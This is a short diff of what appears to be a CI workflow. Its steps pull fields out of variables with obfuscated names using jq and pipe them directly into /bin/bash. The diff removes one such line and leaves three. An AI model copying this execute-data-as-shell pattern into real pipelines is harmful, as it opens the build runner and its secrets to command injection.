@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ggn92" | jq -r .khyow4641 | /bin/bash
           printf '%s' "$os17" | jq -r .nm817 | /bin/bash
           printf '%s' "$yulc29954" | jq -r .n49 | /bin/bash
-          echo $ls930 | jq -r .vt16 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
